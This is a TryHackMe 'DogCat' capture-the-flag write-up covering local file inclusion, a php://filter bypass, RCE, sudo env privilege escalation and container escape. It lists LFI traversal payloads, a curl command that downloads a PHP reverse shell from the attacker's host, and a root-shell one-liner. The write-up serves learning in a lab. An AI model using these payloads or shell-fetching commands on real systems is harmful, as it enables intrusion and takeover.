# DogCat TryHackMe

**VIDEO WRITEUP**

https://youtu.be/wnEVK7xIfcY

**Enumeration**

**Nmap:**

![image](https://user-images.githubusercontent.com/79543461/176386293-cbf1ba92-20aa-4012-9bca-efaeb883aaba.png)

Seeing only SSH and HTTP open, it seems that it will be a web vulnerability

**WhatWeb:**

![image](https://user-images.githubusercontent.com/79543461/176386911-cc73be86-9d60-4c08-8959-e0087ee3ff47.png)

**Web with Browser:**

![image](https://user-images.githubusercontent.com/79543461/176389233-3105ec6b-e61a-4df5-bef0-8f3f5faecd19.png)

**I click in dog and i see this:**

![image](https://user-images.githubusercontent.com/79543461/176389528-0e08f17b-3915-461e-a495-691a1ccf0ec5.png)

**In URL i see "view" parameter, It looks like LFI, let's try basic payloads**

![image](https://user-images.githubusercontent.com/79543461/176389910-70dcc9e5-b0b6-423d-a29b-9a8ddcd61392.png)

That message can mean two things.

Or they have protected the LFI website, Or the devoloper added filters so that an LFI cannot be executed so easily

**Payloads:**

../../../../etc/passwd = **No Work**

../../../../etc/passwd%00 = **No Work**

%252e%252e%252fetc%252fpasswd = **No Work**

%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00 = **No Work**

/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd = **No Work**

**Wrappers:**

Let's try with LFI Wrappers:

expect://whoami = **No Work**

php://filter/convert.base64-encode/resource=index.php = **No work**

Okey anything work, but i try to put cat or dog, it is possible that the filter checks if there is the word dog or cat.

Payload: **dog/etc/passwd**

![image](https://user-images.githubusercontent.com/79543461/176392772-34d8dbd7-ab20-4949-bf3a-97a9e4aa33df.png)

**That's It!!**

Every time I click on cat or dog I get a different picture, that makes me think that it could be a php file that is executed.

But looking at the source code it is very clear to me.

Therefore, to check it is necessary to send a base64 filter in the wrapper and ask it to give me the page cat or dog.

![image](https://user-images.githubusercontent.com/79543461/176395381-0726391b-8cc3-49cd-a33c-561605793226.png)

**WORKS!!! Lets go to Decode Base64 code**

![image](https://user-images.githubusercontent.com/79543461/176395536-b72fb120-52a8-4f4d-8e30-6a11189a9d90.png)

Same with dogs file

![image](https://user-images.githubusercontent.com/79543461/176396151-bc86b5d4-77ca-42fb-90fc-6c2caf3b8ce7.png)

**FFUF:**

Web App are adding .php extension in all the querys.

![image](https://user-images.githubusercontent.com/79543461/176399811-07d12933-5306-449f-983e-19af0110bf6a.png)

**Tryng Payloads I found the correct Payload**

![image](https://user-images.githubusercontent.com/79543461/176399237-64556068-edc0-4774-94dd-b5acfdc30d49.png)

**Decoded base64 index.php code**

![image](https://user-images.githubusercontent.com/79543461/176399650-b30098b2-02ec-4371-8006-8f9c06107134.png)

**Other FFUF**

![image](https://user-images.githubusercontent.com/79543461/176443978-851bd070-272b-47cb-9d54-cde62d16e1d5.png)

**Flag**

![image](https://user-images.githubusercontent.com/79543461/176402871-df440e00-01e7-479e-9cac-10131e797a06.png)

![image](https://user-images.githubusercontent.com/79543461/176444149-15725303-a6ab-47dd-ba1a-6fab61e0277f.png)

**Seeing index.php code• i see ext paramter expected in GET request.**

http://10.10.64.213/?view=php://filter/convert.base64-encode/resource=dog/../flag&ext=.php == WORKS GOOD

http://10.10.24.8/?view=php://filter/convert.base64-encode/resource=dog/../../../../&ext=etc/passwd == **WORKS GOOD!!!!!!!!**

**/etc/passwd**

![image](https://user-images.githubusercontent.com/79543461/176447685-600e98e5-7d55-4958-9d1e-9e829096cef8.png)

**With /etc/hosts i can see this: Is Docker Container**

![image](https://user-images.githubusercontent.com/79543461/176512462-a642fa4a-6c19-4a5b-b3f9-5c5f3c9fe1bb.png)

**RCE**

It's moment to upload to Remote Code Execution

**With this command:** 

![image](https://user-images.githubusercontent.com/79543461/176519831-2248462a-2123-4e21-9848-949560255509.png)

**I have RCE but it's impossible convert to shell.**

I need upload my php reverse shell.

To upload i do the next steps

**1.** Configure the PHP File

![image](https://user-images.githubusercontent.com/79543461/176541693-679fb2c9-3ad0-4053-9cc3-dbb07a6d087b.png)

**2.** Active Python HTTP Server

![image](https://user-images.githubusercontent.com/79543461/176541858-9557c6d3-674d-4a00-b34b-0fc13d41d341.png)

**3.** Download and Save shell with victim machine

curl -o shell.php 10.8.222.251:8000/shell.php

**4.** Activate your Listener 

![image](https://user-images.githubusercontent.com/79543461/176542198-31dcaf95-6d56-4e5d-8b51-cdbf1b67a526.png)

**5.** Open with browser Shell file

http://10.10.223.232/shell.php

And you have shell working

**PrivEsc**

sudo -l

**ENV ROOT SHELL**

I see this user can execute env command with sudo permisions

**GTFOBINS**

![image](https://user-images.githubusercontent.com/79543461/176544171-8efbd861-0814-44ad-9424-3b59f630f5b8.png)

sudo /usr/bin/env /bin/bash

**Root Shell**

![image](https://user-images.githubusercontent.com/79543461/176544345-e977a6c5-008f-410c-8fea-64225dfd861a.png)


**Flag 2 and 3**

![image](https://user-images.githubusercontent.com/79543461/176544642-ae2ae665-b29a-459d-8fed-d05b50dfd48d.png)

**/opt/backups**

I found this!!

![image](https://user-images.githubusercontent.com/79543461/176545146-16e666f2-ef11-4649-8aed-9608128cc450.png)

![image](https://user-images.githubusercontent.com/79543461/176545248-e5d9e4ee-d230-4cd0-9346-b91efd55be2d.png)

tar -xvf backup.tar

**BreakOut Container**

![image](https://user-images.githubusercontent.com/79543461/176548118-ced6fca2-69aa-4d33-856f-5514f1e829b8.png)

![image](https://user-images.githubusercontent.com/79543461/176548234-66df1fae-1520-405d-9066-e84f64087b89.png)

![image](https://user-images.githubusercontent.com/79543461/176548699-b5244b9b-9384-4875-b841-e0b425f7cc58.png)

And Wait...

![image](https://user-images.githubusercontent.com/79543461/176549524-b1b13519-2a68-40f6-83f2-3da54cd6e954.png)

**Root Flag**

![image](https://user-images.githubusercontent.com/79543461/176549617-962ea253-3cbc-4275-8d95-03a063dadbd3.png)

DEMO:

https://youtu.be/wnEVK7xIfcY

Thanks!

